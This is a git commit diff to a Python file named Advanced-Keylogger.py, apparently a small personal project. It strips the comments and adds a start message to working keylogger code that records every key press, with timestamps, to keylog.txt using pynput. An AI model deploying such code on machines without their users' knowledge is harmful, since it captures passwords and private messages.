f7e001bd11800677168241e38790d99d98e8900a
catacisneros <cmcr2002@gmail.com>
2025-05-05 20:04:19 -0400

    dashboard.

--- Advanced-Keylogger.py
+++ Advanced-Keylogger.py
@@ -1,18 +1,15 @@
-from pynput import keyboard # Import the keyboard module to monitor keyboard events
-import logging # Import the logging module (record key presses and releases)
+from pynput import keyboard
+import logging
 
-# Logging configuration 
+# Set up logging
 logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')
-    # Logs will be saved to keylog.txt, includes timestamp and key pressed. Level is set to INFO to record all events.
 
 def on_press(key):
     logging.info(f'Key pressed: {key}')
-    # Function called whenever a key is pressed. Logs the key pressed to the keylog.txt file
 
-
-# Set up the listener 
+# Start the keylogger
+print("Keylogger started. Press Ctrl+C to stop.")
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
-    # Keyboard listener monitors key presses and releases indefinitely
 
 
